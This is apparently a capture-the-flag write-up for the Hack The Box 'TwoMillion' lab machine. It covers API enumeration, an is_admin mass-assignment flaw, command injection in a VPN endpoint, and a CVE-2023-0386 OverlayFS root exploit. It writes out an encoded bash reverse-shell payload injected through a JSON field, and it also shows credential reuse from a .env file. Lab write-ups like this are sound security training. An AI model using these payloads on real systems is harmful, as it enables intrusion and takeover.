# TwoMillion Writeup
<figure><img src="../src/TwoMillion/banner.png"></figure>

### Target IP 10.10.11.221

## Enumeration
Nmap Scan: 
```
┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ nmap -sC -sV -vv 10.10.11.221      
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http?   syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I added `2million.htb` to `/etc/hosts` file.

On opening the URL there is an older version of HackTheBox webpage.

<figure><img src="../src/TwoMillion/homepage.png"></figure>

On inspecting the source code in the `/invite` endpoint. There is a minified js file.

<figure><img src="../src/TwoMillion/unpacked.png"></figure>

After clicking on `auto-decode`, It gave us the code.

<figure><img src="../src/TwoMillion/decoded.png"></figure>

I sent a request to the endpoint `/api/v1/invite/how/to/generate` and got the following response.

```
┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   249    0   249    0     0    265      0 --:--:-- --:--:-- --:--:--   265
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

The response says that the data is encrypted in `ROT13`, On decrypting the data we get the following message.

<figure><img src="../src/TwoMillion/rot13.png"></figure>

So let's generate an invite code.

```
┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ curl -X POST http://2million.htb/api/v1/invite/generate | jq       
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    91    0    91    0     0    134      0 --:--:-- --:--:-- --:--:--   134
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "VTBJR1EtQ1JPQlktMFRRTFktWFdVSko=",
    "format": "encoded"
  }
}
```

The encoding looks like `base64` so let's decode it real quick.

```
┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ echo "VTBJR1EtQ1JPQlktMFRRTFktWFdVSko=" | base64 -d
U0IGQ-CROBY-0TQLY-XWUJJ
```

Let's make an account using this invite code.

<figure><img src="../src/TwoMillion/register.png"></figure>

After logging in with the same credentials, we are redirected to the home page.

<figure><img src="../src/TwoMillion/htbdashboard.png"></figure>

Most of the pages took us to `/access` which was a VPN download page.

I opened Burpsuite and intercepted the request while downloading the Connection Pack.

```
GET /api/v1/user/vpn/generate HTTP/1.1

Host: 2million.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: close

Referer: http://2million.htb/home/access

Cookie: PHPSESSID=cc3n1i5cmnodhcva9ugr2saprf

Upgrade-Insecure-Requests: 1
```

On sending a request to `/api/v1`, I got all the endpoints.

```
┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ curl -s http://2million.htb/api/v1 --cookie "PHPSESSID=cc3n1i5cmnodhcva9ugr2saprf" | jq 
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Let's try to update our user as admin using the `/api/v1/admin/settings/update` endpoint.

```
┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=cc3n1i5cmnodhcva9ugr2saprf" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    53    0    53    0     0     50      0 --:--:--  0:00:01 --:--:--    50
{
  "status": "danger",
  "message": "Invalid content type."
}
```

Let's change the content type to `application/json`.

```
┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=cc3n1i5cmnodhcva9ugr2saprf" --header "Content-Type: application/json" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    56    0    56    0     0      1      0 --:--:--  0:00:45 --:--:--    15
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

Let's add the `email` in `data`.

```
┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=cc3n1i5cmnodhcva9ugr2saprf" --header "Content-Type: application/json" --data '{"email": "test@2million.htb"}' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    89    0    59  100    30     35     18  0:00:01  0:00:01 --:--:--    53
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

Let's also add the `is_admin` parameter.

```
┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=cc3n1i5cmnodhcva9ugr2saprf" --header "Content-Type: application/json" --data '{"email": "test@2million.htb", "is_admin": "true"}' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   126    0    76  100    50     34     22  0:00:02  0:00:02 --:--:--    56
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}

┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=cc3n1i5cmnodhcva9ugr2saprf" --header "Content-Type: application/json" --data '{"email": "test@2million.htb", "is_admin": '1'}' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    89    0    44  100    45     75     77 --:--:-- --:--:-- --:--:--   153
{
  "id": 16,
  "username": "testuser",
  "is_admin": 1
}
```

Let's double check if our user is now an admin.

```
┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=cc3n1i5cmnodhcva9ugr2saprf" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    16    0    16    0     0     12      0 --:--:--  0:00:01 --:--:--    12
{
  "message": true
}
```

Let's try to generate an admin VPN now.

```
┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=cc3n1i5cmnodhcva9ugr2saprf" --header "Content-Type: application/json" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    59    0    59    0     0     54      0 --:--:--  0:00:01 --:--:--    55
{
  "status": "danger",
  "message": "Missing parameter: username"
}
```

I added the username in the data field.

<figure><img src="../src/TwoMillion/generate.png"></figure>

Since its sending the VPN through the command, It might be possible its running it from `exec` or `system` PHP commands. It might be possible to inject commands by using `;id;` after the username.

```
┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=cc3n1i5cmnodhcva9ugr2saprf" --header "Content-Type: application/json" --data '{"username": "testuser;id;"}' 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Let's try to put in a reverse shell.

```
┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=cc3n1i5cmnodhcva9ugr2saprf" --header "Content-Type: application/json" --data '{"username": "testuser;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40NC80NDQ0IDA+JjEK | base64 -d | bash;"}' 
```

<figure><img src="../src/TwoMillion/wwwdata.png"></figure>

On enumeration of the web directory there was a file `.env` which had some credentials.

```
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

On looking at the `passwd` file there was another user called `admin`.

## User Flag

I ssh'd into the user admin using the `DB_PASSWORD`.

<figure><img src="../src/TwoMillion/admin.png"></figure>

And I got the user flag.

I found a mail to the admin on `/var/mail`.

```
admin@2million:/var/mail$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

I enumerated for information regarding the OS after I saw that mail.


## Root Flag

I downloaded the exploit locally made it to a zip file and used scp to send it to the admin.

```
┌──(kali㉿kali)-[~/Desktop/htb/twomillion]
└─$ scp cve.zip admin@2million.htb:/tmp           
admin@2million.htb's password: 
cve.zip                                                                                                100%  460KB  57.6KB/s   00:07    
```

Unzipping the file.

```
admin@2million:/tmp/CVE-2023-0386$ make all
admin@2million:/tmp/CVE-2023-0386$ ./fuse ovlcap/lower ./gc &
[1] 1764
[+] len of gc: 0x3ee0

admin@2million:/tmp/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
[+] readdir
[+] getattr_callback
/file
total 8
drwxrwxr-x 1 root   root     4096 May 23 12:30 .
drwxr-xr-x 6 root   root     4096 May 23 12:30 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386# 
```

And the machine is rooted.

Thank you!! Happy Hacking :D